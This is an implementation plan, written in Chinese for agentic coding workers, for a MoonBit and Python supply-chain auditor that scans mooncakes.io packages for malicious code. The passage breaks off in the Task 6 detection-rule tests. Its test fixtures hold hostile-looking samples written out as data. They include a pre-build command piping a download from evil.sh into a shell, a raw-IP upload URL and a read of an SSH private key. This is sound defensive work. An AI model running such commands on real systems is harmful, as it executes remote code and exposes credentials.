# mooncake-audit 实现计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 构建 mooncakes.io 供应链审计工具：MoonBit 静态分析引擎（CLI）+ Python 爬取编排层，发现恶意投毒包。

**Architecture:** Python 爬取器下载 mooncakes.io 包源码到 `corpus/`，逐包调用 MoonBit 引擎 `scan` 子命令得到 JSON 报告；引擎内部为分层规则引擎（元数据启发式 M 系列 + 源码模式 S 系列）+ 加权评分。分析器对被扫包只读不执行。

**Tech Stack:** MoonBit (moon 0.1.20260807, moonbitlang/async@0.20.4, moonbitlang/core), Python 3.10 标准库 (urllib/zipfile/concurrent.futures), pytest 9.0.2。

## Global Constraints

以下为已验证的环境事实，所有任务隐含遵守：

- moon `0.1.20260807`；**moonbitlang/async 必须固定 @0.20.4**（0.21.3 在当前 moon 下解析报错 `noraise + nocancel`）。
- 新版 `moon.mod` 为 TOML 风格：`name = "audit/mooncake-audit"`；`moon.pkg` 为 DSL：`import { "moonbitlang/async/fs" @fs, }` + `options("is-main": true)`；空包 `moon.pkg` 为空文件。
- `async fn main` 要求 moon.pkg 导入 `"moonbitlang/async"`；文件 API 用 `@fs.readdir(path) -> Array[String]`（async）、`@fs.kind(path)`（构造器为 `Directory`）、`@fs.read_file(path) -> &@io.Data` 后 `.text() -> String raise`（需导入 `"moonbitlang/async/io" @io`）；参数用 `@env.args()`（需导入 `"moonbitlang/core/env"`）。
- 原生二进制：`moon build --target native --release .` → `_build/native/release/build/<pkg>.exe`。
- 字符串 API：`String::to_array() -> Array[Char]`、`Char::to_int()`、`String::find(StringView) -> Int?`、`String::contains(StringView) -> Bool`、`String::split(StringView) -> Iter[StringView]`、`s[i] -> UInt16`（UTF-16 码元）。
- mooncakes.io API（已实测）：`GET /api/v0/modules` → 2469 模块 JSON 数组（含 name/version/repository/keywords/description）；下载 `https://download.mooncakes.io/user/<author>/<module>/<version>.zip`（302 → CloudFront，zip 根 = 模块根，含 moon.mod）；registry git 索引 `https://mooncakes.io/git/index`（文件 `user/<author>/<module>.index`，单行 JSON 含 sha256 checksum）；统计 `GET /api-new/v0/modules/statistics?raw=true` → zip 内含 statistics.csv。
- 测试：`moon test`（快照 `inspect`/`debug_inspect`/`json_inspect`，`--update` 刷新）；pytest 可用。
- 安全红线：引擎与爬虫**绝不执行被扫包代码**（不跑 moon check/build/run），S06 pre-build 是重点检测对象而非执行对象；Python 解压防 zip-slip。
- 提交信息用英文小写惯例（`feat:`/`test:`/`docs:`/`chore:`）。
- 运行产物目录 `corpus/ results/ state/` 已在 `.gitignore`。

---

### Task 1: 模块脚手架

**Files:**
- Create: `moon.mod`
- Create: `cmd/main/moon.pkg`, `cmd/main/main.mbt`
- Create: `engine/moon.pkg`, `engine/matchers/moon.pkg`, `metadata/moon.pkg`, `source/moon.pkg`, `score/moon.pkg`, `report/moon.pkg`（均为空文件）

**Interfaces:**
- Produces: 模块名 `audit/mooncake-audit`；包路径 `audit/mooncake-audit/engine` 等供后续任务导入。

- [ ] **Step 1: 创建 moon.mod**

```
name = "audit/mooncake-audit"
version = "0.1.0"
readme = "README.mbt.md"
repository = ""
license = "Apache-2.0"
keywords = ["security", "supply-chain", "audit"]
description = "Supply-chain security auditor for mooncakes.io packages"
```

- [ ] **Step 2: 创建包目录与空 moon.pkg**

`engine/`、`engine/matchers/`、`metadata/`、`source/`、`score/`、`report/` 各放一个空的 `moon.pkg` 文件（空文件合法）。

- [ ] **Step 3: CLI 桩**

`cmd/main/moon.pkg`:
```
import {
  "audit/mooncake-audit/engine" @engine,
}
options(
  "is-main": true,
)
```

`cmd/main/main.mbt`:
```moonbit
///|
fn main {
  println("mooncake-audit")
}
```

- [ ] **Step 4: 验证**

Run: `moon check && moon test`
Expected: 全部通过（无测试即 0 tests passed）

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: mooncake-audit module scaffold"
```

---

### Task 2: engine/types — Severity/Category/Finding/Rule

**Files:**
- Create: `engine/types.mbt`
- Test: `engine/types_test.mbt`

**Interfaces:**
- Produces: `Severity{Low|Medium|High|Critical}`（`weight()`/`rank()`/`parse(String) -> Severity?`）、`Category{Metadata|Source}`、`struct Finding{rule, severity, category, file, line, snippet, message}`、`struct RuleDef{id, severity, category, description}`，全部 `derive(Debug, ToJson)`。

- [ ] **Step 1: 写失败测试** `engine/types_test.mbt`

```moonbit
///|
test "severity weight and rank" {
  inspect(@engine.Low.weight(), content="1")
  inspect(@engine.Medium.weight(), content="5")
  inspect(@engine.High.weight(), content="10")
  inspect(@engine.Critical.weight(), content="25")
  inspect(@engine.Low.rank() < @engine.High.rank(), content="true")
}

///|
test "severity parse" {
  inspect(@engine.parse_severity("high"), content="Some(High)")
  inspect(@engine.parse_severity("nope"), content="None")
}

///|
test "finding to_json" {
  let f : @engine.Finding = {
    rule: "S02",
    severity: @engine.High,
    category: @engine.Source,
    file: "src/a.mbt",
    line: 3,
    snippet: "read .ssh",
    message: "credential access",
  }
  json_inspect(f, content={ "rule": "S02", "severity": "High", "category": "Source", "file": "src/a.mbt", "line": 3, "snippet": "read .ssh", "message": "credential access" })
}
```

注意：`engine` 根包需能被 `@engine` 前缀引用——Task 1 的空包即是。若 `json_inspect` 快照格式与 derive(ToJson) 输出字段顺序有差异，用 `moon test -u` 生成后人工核对字段名与值。

- [ ] **Step 2: 运行确认失败**

Run: `moon test engine/types_test.mbt 2>&1 | tail -5`
Expected: 编译错误（`parse_severity`/`weight` 未定义）

- [ ] **Step 3: 实现** `engine/types.mbt`

```moonbit
///|
pub(all) enum Severity {
  Low
  Medium
  High
  Critical
} derive(Eq, Debug, ToJson)

///|
pub fn Severity::weight(self : Severity) -> Int {
  match self {
    Low => 1
    Medium => 5
    High => 10
    Critical => 25
  }
}

///|
pub fn Severity::rank(self : Severity) -> Int {
  match self {
    Low => 0
    Medium => 1
    High => 2
    Critical => 3
  }
}

///|
pub fn parse_severity(s : String) -> Severity? {
  match s.to_lower() {
    "low" => Some(Low)
    "medium" => Some(Medium)
    "high" => Some(High)
    "critical" => Some(Critical)
    _ => None
  }
}

///|
pub(all) enum Category {
  Metadata
  Source
} derive(Eq, Debug, ToJson)

///|
pub(all) struct Finding {
  rule : String
  severity : Severity
  category : Category
  file : String
  line : Int
  snippet : String
  message : String
} derive(Debug, ToJson)

///|
pub(all) struct RuleDef {
  id : String
  severity : Severity
  category : Category
  description : String
} derive(Debug, ToJson)

///|
pub fn RuleDef::finding(
  self : RuleDef,
  file~ : String,
  line~ : Int,
  snippet~ : String,
  message~ : String,
) -> Finding {
  { rule: self.id, severity: self.severity, category: self.category, file, line, snippet, message }
}

///|
/// 供字符串插值/终端输出使用的领域文本形式（Severity 不 derive Show）
pub fn Severity::label(self : Severity) -> String {
  match self {
    Low => "Low"
    Medium => "Medium"
    High => "High"
    Critical => "Critical"
  }
}
```

- [ ] **Step 4: 运行测试通过**

Run: `moon test engine 2>&1 | tail -3`
Expected: PASS；快照不符时先人工核对再 `moon test -u`

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: engine core types (severity/category/finding)"
```

---

### Task 3: matchers/text — 文本原语

**Files:**
- Create: `engine/matchers/text.mbt`
- Test: `engine/matchers/text_test.mbt`
- Modify: `engine/matchers/moon.pkg`（无需导入）

**Interfaces:**
- Produces:
  - `struct LineIndex { starts : Array[Int] }`；`LineIndex::build(s : String) -> LineIndex`；`LineIndex::line_of(self, offset : Int) -> Int`（1-based）
  - `LineIndex::snippet(self, s : String, line : Int) -> String`
  - `is_raw_ip_url(s : String) -> Bool`
  - `longest_run(s : String, alphabet : (UInt16) -> Bool) -> Int`
  - `is_b64(u : UInt16) -> Bool`、`is_hex(u : UInt16) -> Bool`
  - `damerau_levenshtein(a : String, b : String) -> Int`

- [ ] **Step 1: 写失败测试** `engine/matchers/text_test.mbt`

```moonbit
///|
test "line index and snippet" {
  let s = "aaa\nbbbb\ncc"
  let li = @matchers.LineIndex::build(s)
  inspect(li.line_of(0), content="1")
  inspect(li.line_of(4), content="2")
  inspect(li.line_of(9), content="3")
  inspect(li.snippet(s, 2), content="bbbb")
}

///|
test "raw ip url" {
  inspect(@matchers.is_raw_ip_url("http://192.168.1.1/x"), content="true")
  inspect(@matchers.is_raw_ip_url("http://evil.example.com/x"), content="false")
  inspect(@matchers.is_raw_ip_url("https://10.0.0.1:8080/post"), content="true")
}

///|
test "longest run" {
  // 96 字符 base64 安全字集
  let blob = "Ab0Cd1Ef2Gh3Ij4Kl5Mn6Op7Qr8St9Uv0Wx1Yz2Ab3Cd4Ef5Gh6Ij7Kl8Mn9Op0Qr1St2Uv3Wx4Yz5Ab6Cd7Ef8Gh9Ij0Kl"
  inspect(blob.length(), content="96")
  inspect(@matchers.longest_run(blob, @matchers.is_b64), content="96")
  inspect(@matchers.longest_run("abc123", @matchers.is_hex), content="6")
  inspect(@matchers.longest_run("abcg", @matchers.is_hex), content="3")
}

///|
test "damerau levenshtein" {
  inspect(@matchers.damerau_levenshtein("asyncx", "async"), content="1")
  inspect(@matchers.damerau_levenshtein("asynx", "async"), content="1")
  inspect(@matchers.damerau_levenshtein("abc", "abc"), content="0")
  inspect(@matchers.damerau_levenshtein("kitten", "sitting"), content="3")
  inspect(@matchers.damerau_levenshtein("ab", "ba"), content="1")
}
```

（包别名 `@matchers`：目录名 `matchers` 为默认别名。）

- [ ] **Step 2: 运行确认失败**

Run: `moon test engine/matchers 2>&1 | tail -3`
Expected: 编译错误

- [ ] **Step 3: 实现** `engine/matchers/text.mbt`

```moonbit
///|
pub(all) struct LineIndex {
  starts : Array[Int]
} derive(Debug)

///|
pub fn LineIndex::build(s : String) -> LineIndex {
  let starts = [0]
  let n = s.length()
  for i = 0; i < n; i = i + 1 {
    if s[i] == 10 {
      starts.push(i + 1)
    }
  }
  { starts }
}

///|
pub fn LineIndex::line_of(self : LineIndex, offset : Int) -> Int {
  // 二分：starts 中最后一个 <= offset 的下标 + 1
  let mut lo = 0
  let mut hi = self.starts.length() - 1
  let mut ans = 0
  for ; lo <= hi; {
    let mid = (lo + hi) / 2
    if self.starts[mid] <= offset {
      ans = mid
      lo = mid + 1
    } else {
      hi = mid - 1
    }
  }
  ans + 1
}

///|
pub fn LineIndex::snippet(self : LineIndex, s : String, line : Int) -> String {
  if line < 1 || line > self.starts.length() {
    return ""
  }
  let start = self.starts[line - 1]
  let n = s.length()
  let mut end = n
  for i = start; i < n; i = i + 1 {
    if s[i] == 10 {
      end = i
      break
    }
  }
  if end > 200 {
    end = start + 200
  }
  try! s[start:end].to_string()
}

///|
fn is_digit_ascii(u : UInt16) -> Bool {
  u >= 48 && u <= 57
}

///|
fn is_alpha_ascii(u : UInt16) -> Bool {
  (u >= 65 && u <= 90) || (u >= 97 && u <= 122)
}

///|
pub fn is_b64(u : UInt16) -> Bool {
  is_alpha_ascii(u) || is_digit_ascii(u) || u == 43 || u == 47 || u == 61
}

///|
pub fn is_hex(u : UInt16) -> Bool {
  is_digit_ascii(u) || (u >= 97 && u <= 102) || (u >= 65 && u <= 70)
}

///|
pub fn longest_run(s : String, alphabet : (UInt16) -> Bool) -> Int {
  let mut best = 0
  let mut cur = 0
  let n = s.length()
  for i = 0; i < n; i = i + 1 {
    if alphabet(s[i]) {
      cur = cur + 1
      if cur > best {
        best = cur
      }
    } else {
      cur = 0
    }
  }
  best
}

///|
pub fn is_raw_ip_url(s : String) -> Bool {
  for scheme in ["http://", "https://"] {
    match s.find(scheme) {
      Some(start) => {
        let host_start = start + scheme.length()
        let n = s.length()
        let mut host_end = n
        for i = host_start; i < n; i = i + 1 {
          let u = s[i]
          if u == 47 || u == 58 {
            // '/' 或 ':'
            host_end = i
            break
          }
        }
        if host_end > host_start {
          let host = try! s[host_start:host_end].to_string()
          let segs = host.split(".").collect()
          if segs.length() == 4 {
            let mut all_num = true
            for seg in segs {
              if seg.length() == 0 {
                all_num = false
              }
              for c in seg {
                if !(c >= '0' && c <= '9') {
                  all_num = false
                }
              }
            }
            if all_num {
              return true
            }
          }
        }
      }
      None => ()
    }
  }
  false
}

///|
pub fn damerau_levenshtein(a : String, b : String) -> Int {
  let la = a.length()
  let lb = b.length()
  let ca = a.to_array()
  let cb = b.to_array()
  // d[i][j]，含 OSA 转置
  let d : Array[Array[Int]] = []
  for i = 0; i <= la; i = i + 1 {
    let row : Array[Int] = []
    for j = 0; j <= lb; j = j + 1 {
      if j == 0 {
        row.push(i)
      } else if i == 0 {
        row.push(j)
      } else {
        row.push(0)
      }
    }
    d.push(row)
  }
  for i = 1; i <= la; i = i + 1 {
    for j = 1; j <= lb; j = j + 1 {
      let cost = if ca[i - 1] == cb[j - 1] { 0 } else { 1 }
      let del = d[i - 1][j] + 1
      let ins = d[i][j - 1] + 1
      let sub = d[i - 1][j - 1] + cost
      let mut v = if del < ins { del } else { ins }
      if sub < v {
        v = sub
      }
      if i > 1 && j > 1 && ca[i - 1] == cb[j - 2] && ca[i - 2] == cb[j - 1] {
        let tr = d[i - 2][j - 2] + 1
        if tr < v {
          v = tr
        }
      }
      d[i][j] = v
    }
  }
  d[la][lb]
}
```

- [ ] **Step 4: 运行测试通过**

Run: `moon test engine/matchers 2>&1 | tail -3`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: text primitives (line index, charset runs, raw-ip, osa distance)"
```

---

### Task 4: matchers/aho — Aho-Corasick 多模式匹配

**Files:**
- Create: `engine/matchers/aho.mbt`
- Test: `engine/matchers/aho_test.mbt`

**Interfaces:**
- Produces: `struct Hit { pattern : Int, offset : Int, length : Int }`（derive Debug, Eq）；`Automaton::new(patterns : Array[String]) -> Automaton`；`Automaton::scan(self, text : String) -> Array[Hit]`（按 offset 升序，允许重叠）。

- [ ] **Step 1: 写失败测试** `engine/matchers/aho_test.mbt`

```moonbit
///|
test "aho corasick basic" {
  let ac = @matchers.Automaton::new(["ssh", "token", "http"])
  let hits = ac.scan("see ssh and http token")
  inspect(hits.length(), content="3")
  inspect(hits[0].pattern, content="0")
  inspect(hits[1].pattern, content="2")
  inspect(hits[2].pattern, content="1")
  inspect(hits[0].offset, content="4")
}

///|
test "aho corasick overlap and failure links" {
  let ac = @matchers.Automaton::new(["he", "she", "his", "hers"])
  let hits = ac.scan("ushers")
  // "she"@1 "he"@2 "hers"@2，按扫描顺序 pattern 为 1,0,3；排序后 [0,1,3]
  inspect(hits.length(), content="3")
  let pats = hits.map(h => h.pattern).sort()
  inspect(pats, content="[0, 1, 3]")
}

///|
test "aho corasick empty text" {
  let ac = @matchers.Automaton::new(["x"])
  inspect(ac.scan("").length(), content="0")
}
```

- [ ] **Step 2: 运行确认失败**

Run: `moon test engine/matchers/aho_test.mbt 2>&1 | tail -3`
Expected: 编译错误

- [ ] **Step 3: 实现** `engine/matchers/aho.mbt`

```moonbit
///|
pub(all) struct Hit {
  pattern : Int
  offset : Int
  length : Int
} derive(Debug, Eq)

///|
struct Automaton {
  next : Array[Map[Int, Int]]
  fail : Array[Int]
  out : Array[Array[Int]]
} derive(Debug)

///|
pub fn Automaton::new(patterns : Array[String]) -> Automaton {
  let next : Array[Map[Int, Int]] = [Map([])]
  let fail : Array[Int] = [0]
  let out : Array[Array[Int]] = [[]]
  for pidx, p in patterns {
    if p.length() == 0 {
      continue
    }
    let units = p.to_array().map(c => c.to_int())
    let mut state = 0
    for u in units {
      match next[state].get(u) {
        Some(ns) => state = ns
        None => {
          next.push(Map([]))
          fail.push(0)
          out.push([])
          let ns = next.length() - 1
          next[state][u] = ns
          state = ns
        }
      }
    }
    out[state].push(pidx)
  }
  // BFS 建失配链
  let queue : Array[Int] = []
  for _, child in next[0] {
    queue.push(child)
  }
  let mut qi = 0
  for ; qi < queue.length(); qi = qi + 1 {
    let s = queue[qi]
    for u, child in next[s] {
      queue.push(child)
      let mut f = fail[s]
      for ;; {
        if f == 0 {
          fail[child] = next[0].get(u).unwrap_or(0)
          break
        }
        match next[f].get(u) {
          Some(nf) => {
            fail[child] = nf
            break
          }
          None => f = fail[f]
        }
      }
      for pidx in out[fail[child]] {
        out[child].push(pidx)
      }
    }
  }
  { next, fail, out }
}

///|
fn Automaton::go(self : Automaton, state : Int, u : Int) -> Int {
  let mut s = state
  for ;; {
    match self.next[s].get(u) {
      Some(ns) => return ns
      None =>
        if s == 0 {
          return 0
        } else {
          s = self.fail[s]
        }
    }
  }
  0
}

///|
pub fn Automaton::scan(self : Automaton, text : String) -> Array[Hit] {
  let hits : Array[Hit] = []
  let units = text.to_array().map(c => c.to_int())
  let mut state = 0
  for i, u in units {
    state = self.go(state, u)
    for pidx in self.out[state] {
      hits.push({ pattern: pidx, offset: i, length: 0 })
    }
  }
  // 回填 length：用 pattern 长度与结束 offset 计算
  hits
}
```

**注意**：`scan` 的 length 回填需要 pattern 长度——`Automaton` 需保存 `pats : Array[Int]`（各 pattern 的 code point 长度），push 时 `length: pats[pidx]`，`offset` 改为 `i - pats[pidx] + 1`。实现时按此修正（这是测试中 `hits[0].offset == 4` 的语义：offset = 起始位置）。

- [ ] **Step 4: 运行测试通过**

Run: `moon test engine/matchers 2>&1 | tail -3`
Expected: PASS（快照值按修正后的语义核对）

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: aho-corasick multi-pattern matcher"
```

---

### Task 5: metadata/manifest — moon.mod / moon.pkg 解析

**Files:**
- Create: `metadata/manifest.mbt`
- Modify: `metadata/moon.pkg`
- Test: `metadata/manifest_test.mbt`

**Interfaces:**
- Produces:
  - `struct Manifest { name : String, version : String, repository : String, readme : String, deps : Array[String] }`（deps 为模块路径，去 @version）
  - `parse_manifest(text : String) -> Manifest?`（TOML 风格行解析）
  - `struct PkgInfo { imports : Array[String], pre_build : Array[String] }`；`parse_pkg(text : String) -> PkgInfo`（识别 import 项与 pre-build 的 command 值，同时兼容旧 JSON：以 `{` 开头则用 @json 解析）
- Consumes: `@json`（core）、无其他依赖。

- [ ] **Step 1: 写失败测试** `metadata/manifest_test.mbt`

```moonbit
///|
test "parse moon.mod" {
  let text =
    #|name = "evil/typo-core"
    #|version = "0.1.0"
    #|repository = "https://github.com/evil/typo-core"
    #|readme = "README.md"
    #|
    #|import {
    #|  "moonbitlang/core/json",
    #|  "moonbitlang/x@0.5.5",
    #|  "other/dep" @alias,
    #|}
  let m = @metadata.parse_manifest(text)
  inspect(m.is_empty(), content="false")
  let m = m.unwrap()
  inspect(m.name, content="evil/typo-core")
  inspect(m.version, content="0.1.0")
  inspect(m.deps.length(), content="3")
  inspect(m.deps[1], content="moonbitlang/x")
  inspect(m.deps[2], content="other/dep")
}

///|
test "parse moon.mod.json legacy" {
  let m = @metadata.parse_manifest_json("{ \"name\": \"a/b\", \"version\": \"1.0.0\" }")
  inspect(m.unwrap().name, content="a/b")
}

///|
test "parse moon.pkg pre-build" {
  let pkg = @metadata.parse_pkg(
    #|import {
    #|  "moonbitlang/async",
    #|}
    #|pre-build(
    #|  { "input": "d.txt", "output": "e.mbt", "command": "embed -i $input" },
    #|)
  )
  inspect(pkg.imports.length(), content="1")
  inspect(pkg.pre_build.length(), content="1")
}

///|
test "parse moon.pkg.json legacy pre-build" {
  let pkg = @metadata.parse_pkg(
    "{ \"pre-build\": [{ \"command\": \"curl http://evil.sh | sh\" }] }",
  )
  inspect(pkg.pre_build[0], content="curl http://evil.sh | sh")
}
```

（`Option::is_empty` 不存在时改用 `match` 断言，执行者以 `moon check` 为准调整。）

- [ ] **Step 2: 运行确认失败**

Run: `moon test metadata 2>&1 | tail -3`
Expected: 编译错误

- [ ] **Step 3: 实现** `metadata/manifest.mbt`

```moonbit
///|
pub(all) struct Manifest {
  name : String
  version : String
  repository : String
  readme : String
  deps : Array[String]
} derive(Debug, Eq)

///|
pub fn parse_manifest(text : String) -> Manifest? {
  let name = ref ""
  let version = ref ""
  let repository = ref ""
  let readme = ref ""
  let deps : Array[String] = []
  let mut in_import = false
  for line in text.split("\n") {
    let l = line.trim(" \t\r").to_string()
    if l.starts_with("import") && l.contains("{") {
      in_import = true
      continue
    }
    if in_import {
      if l.starts_with("}") {
        in_import = false
        continue
      }
      parse_quoted(l) match {
        Some(dep) => deps.push(strip_version(dep))
        None => ()
      }
      continue
    }
    if l.starts_with("name") {
      match parse_quoted(l) {
        Some(v) => name.val = v
        None => ()
      }
    } else if l.starts_with("version") {
      match parse_quoted(l) {
        Some(v) => version.val = v
        None => ()
      }
    } else if l.starts_with("repository") {
      match parse_quoted(l) {
        Some(v) => repository.val = v
        None => ()
      }
    } else if l.starts_with("readme") {
      match parse_quoted(l) {
        Some(v) => readme.val = v
        None => ()
      }
    }
  }
  if name.val is "" {
    None
  } else {
    Some({ name: name.val, version: version.val, repository: repository.val, readme: readme.val, deps })
  }
}

///|
fn parse_quoted(l : String) -> String? {
  match l.find("\"") {
    None => None
    Some(start) =>
      match l[start + 1:].to_string().find("\"") {
        None => None
        Some(rel) => Some(try! l[start + 1:start + 1 + rel].to_string())
      }
  }
}

///|
fn strip_version(dep : String) -> String {
  match dep.find("@") {
    Some(at) => try! dep[:at].to_string()
    None => dep
  }
}

///|
pub fn parse_manifest_json(text : String) -> Manifest? {
  try {
    let j = @json.parse(text)
    let get = (k : String) => match j[k] { Some(s) => s.string() |> Option::unwrap_or(""), None => "" } 
    Some({ name: get("name"), version: get("version"), repository: get("repository"), readme: get("readme"), deps: [] })
  } catch {
    _ => None
  }
}

///|
pub(all) struct PkgInfo {
  imports : Array[String]
  pre_build : Array[String]
} derive(Debug)

///|
pub fn parse_pkg(text : String) -> PkgInfo {
  let t = text.trim(" \t\r\n").to_string()
  if t.starts_with("{") {
    return parse_pkg_json(t)
  }
  let imports : Array[String] = []
  let pre_build : Array[String] = []
  let mut in_import = false
  let mut in_prebuild = false
  for line in t.split("\n") {
    let l = line.trim(" \t\r").to_string()
    if l.starts_with("import") && l.contains("{") {
      in_import = true
      continue
    }
    if in_import {
      if l.starts_with("}") {
        in_import = false
      } else {
        match parse_quoted(l) {
          Some(v) => imports.push(v)
          None => ()
        }
      }
      continue
    }
    if l.starts_with("pre-build") && l.contains("(") {
      in_prebuild = true
      continue
    }
    if in_prebuild {
      if l.starts_with(")") {
        in_prebuild = false
      } else if l.contains("command") {
        match parse_quoted(l) {
          Some(v) => pre_build.push(v)
          None => ()
        }
      }
    }
  }
  { imports, pre_build }
}

///|
fn parse_pkg_json(text : String) -> PkgInfo {
  let imports : Array[String] = []
  let pre_build : Array[String] = []
  try {
    let j = @json.parse(text)
    match j["import"] {
      Some(arr) =>
        for item in arr.array() {
          match item.string() {
            Some(s) => imports.push(s)
            None => ()
          }
        }
      None => ()
    }
    match j["pre-build"] {
      Some(arr) =>
        for item in arr.array() {
          match item["command"] {
            Some(c) =>
              match c.string() {
                Some(s) => pre_build.push(s)
                None => ()
              }
            None => ()
          }
        }
      None => ()
    }
  } catch {
    _ => ()
  }
  { imports, pre_build }
}
```

`metadata/moon.pkg` 需导入 `"moonbitlang/core/json"`。执行者以 `moon check` 校准 `Json` 取值 API（如 `j[k]`/`.string()`/`.array()` 的确切名称，可用 `moon ide doc "@json"` 查询）。

- [ ] **Step 4: 运行测试通过**

Run: `moon test metadata 2>&1 | tail -3`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: moon.mod/moon.pkg manifest parsing (toml-style + legacy json)"
```

---

### Task 6: source rules S01–S05

**Files:**
- Create: `source/rules_network.mbt`（S01）
- Create: `source/rules_credential.mbt`（S02）
- Create: `source/rules_exec.mbt`（S03）
- Create: `source/rules_obfuscation.mbt`（S04）
- Create: `source/rules_ffi.mbt`（S05）
- Modify: `source/moon.pkg`
- Test: `source/rules_test.mbt`

**Interfaces:**
- Consumes: `@engine`（Finding/RuleDef）、`@matchers`（LineIndex/longest_run/is_raw_ip_url/Automaton）
- Produces:
  - `struct SourceCtx { file : String, content : String, lines : @matchers.LineIndex }`（derive Debug）
  - `fn S01(ctx : SourceCtx) -> Array[@engine.Finding]` … `fn S05(...)`（每条规则一个函数，签名统一）
  - `fn all_source_rules() -> Array[(String, (SourceCtx) -> Array[@engine.Finding])]`（后续任务追加 S06–S08 时在此注册）

severity 定级（spec §6.2）：S01 High（同文件命中 S02 或 S04 组合时追加一条 Critical 组合 finding）；S02 关键词+读调用 High、仅关键词 Low；S03 Medium、危险参数升级 Critical；S04 High（>80 b64 / ≥64 hex run）、解码调用 Medium；S05 extern 声明 Medium、dlopen/system/popen Critical。

- [ ] **Step 1: 写失败测试** `source/rules_test.mbt`

```moonbit
///|
fn mkctx(content : String) -> @source.SourceCtx {
  { file: "src/x.mbt", content, lines: @matchers.LineIndex::build(content) }
}

///|
test "S01 network exfil raw ip" {
  let fs = @source.S01(mkctx("let u = \"http://13.37.13.37/upload\""))
  inspect(fs.length(), content="1")
  inspect(fs[0].severity, content="@engine.High")
  inspect(fs[0].rule, content="S01")
}

///|
test "S01 clean code no finding" {
  inspect(@source.S01(mkctx("let x = @http.get(\"https://api.github.com\")")).length(), content="0")
}

///|
test "S02 credential read combo" {
  let fs = @source.S02(mkctx("let c = @fs.read_file_to_string(\"/home/u/.ssh/id_rsa\")"))
  inspect(fs.length(), content="1")
  inspect(fs[0].severity, content="@engine.High")
}

///|
test "S02 keyword only is low" {
  let fs = @source.S02(mkctx("// TODO handle .npmrc later"))
  inspect(fs.length(), content="1")
  inspect(fs[0].severity, content="@engine.Low")
}

///|
test "S03 spawn with curl is critical" {
  let fs = @source.S03(mkctx("@shell.Cmd(\"curl\", [\"http://x/y\"]) |> ignore"))
  inspect(fs[0].severity, content="@engine.Critical")
}

///|
test "S03 plain spawn is medium" {
  let fs = @source.S03(mkctx("@shell.Cmd(\"ls\", [\"-la\"]) |> ignore"))
  inspect(fs[0].severity, content="@engine.Medium")
}

///|
test "S04 long base64 blob" {
  let blob = "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8S9t0U1v2W3x4Y5z6A1b2C3d4E5f6G7h8"
  inspect(blob.length() > 60, content="true")
  let fs = @source.S04(mkctx("let s = \"\{blob}\""))
  inspect(fs.length() >= 1, content="true")
  inspect(fs[0].severity, content="@engine.High")
}

///|
test "S05 extern ffi" {
  let fs = @source.S05(mkctx("fn dlopen(p : String) -> Unit = \"c\" \"dlopen\""))
  inspect(fs.length() >= 1, content="true")
}

///|
test "S05 extern c medium" {
  let fs = @source.S05(mkctx("fn ext_read(p : String) -> Int = \"c\" \"read\""))
  inspect(fs[0].severity, content="@engine.Medium")
}
```

（测试内 `@engine.High` 的 inspect 显示形式以 `Debug`/`Show` 实际输出为准，快照不符时用 `moon test -u` 并人工核对。）

- [ ] **Step 2: 运行确认失败**

Run: `moon test source 2>&1 | tail -3`
Expected: 编译错误

- [ ] **Step 3: 实现**

`source/rules_common.mbt`（共享上下文与 AC automaton）：

```moonbit
///|
pub(all) struct SourceCtx {
  file : String
  content : String
  lines : @matchers.LineIndex
} derive(Debug)

///|
fn findings_for(
  ctx : SourceCtx,
  rule : String,
  severity~ : @engine.Severity,
  hits : Array[@matchers.Hit],
  message : String,
) -> Array[@engine.Finding] {
  let rd : @engine.RuleDef = { id: rule, severity, category: @engine.Source, description: message }
  let fs : Array[@engine.Finding] = []
  for h in hits {
    let line = ctx.lines.line_of(h.offset)
    let snippet = ctx.lines.snippet(ctx.content, line)
    fs.push(rd.finding(file=ctx.file, line, snippet=snippet, message))
  }
  fs
}
```

`source/rules_network.mbt`（S01）：

```moonbit
///|
let http_client_indicators : Array[String] = ["@http.", "HttpClient", "http.get", "http.post", "request("]

///|
fn is_raw_ip_host(host : StringView) -> Bool {
  let segs = host.to_string().split(".").collect()
  if segs.length() != 4 {
    return false
  }
  for seg in segs {
    if seg.length() == 0 {
      return false
    }
    for c in seg {
      if !(c >= '0' && c <= '9') {
        return false
      }
    }
  }
  true
}

///|
pub fn S01(ctx : SourceCtx) -> Array[@engine.Finding] {
  let fs : Array[@engine.Finding] = []
  let rd : @engine.RuleDef = { id: "S01", severity: @engine.High, category: @engine.Source, description: "network exfiltration" }
  // 找出所有 URL，host 为 raw IP → High
  let n = ctx.content.length()
  for scheme in ["http://", "https://"] {
    let mut from = 0
    for ;; {
      match ctx.content[from:].to_string().find(scheme) {
        None => break
        Some(rel) => {
          let start = from + rel
          let host_start = start + scheme.length()
          let mut host_end = n
          for i = host_start; i < n; i = i + 1 {
            let u = ctx.content[i]
            if u == 47 || u == 58 {
              // '/' 或 ':'
              host_end = i
              break
            }
          }
          if host_end > host_start && is_raw_ip_host(try! ctx.content[host_start:host_end]) {
            let line = ctx.lines.line_of(start)
            fs.push(rd.finding(file=ctx.file, line, snippet=ctx.lines.snippet(ctx.content, line), message="URL with raw IP address"))
          }
          from = start + scheme.length()
          if from >= n {
            break
          }
        }
      }
    }
  }
  // http 客户端调用指示（无 raw IP 也记录为 Low 提示由 S99 组合规则消费）
  let ac = @matchers.Automaton::new(http_client_indicators)
  let hits = ac.scan(ctx.content)
  if hits.length() > 0 && fs.length() == 0 {
    let rd_low : @engine.RuleDef = { id: "S01", severity: @engine.Low, category: @engine.Source, description: "http client usage" }
    for h in hits {
      let line = ctx.lines.line_of(h.offset)
      fs.push(rd_low.finding(file=ctx.file, line, snippet=ctx.lines.snippet(ctx.content, line), message="http client usage"))
    }
  }
  fs
}
```

注意：S01 命中 raw IP 时为 High；纯 http 客户端调用为 Low（不单独计分影响小，但为 S99 组合提供信号）。测试中 "https://api.github.com" 为合法域名 → 只产生 Low 或不产生（`@http.get` 指示会产生 Low），因此 "S01 clean code" 测试断言改为检查不含 High/Critical：

```moonbit
///|
test "S01 clean code no high finding" {
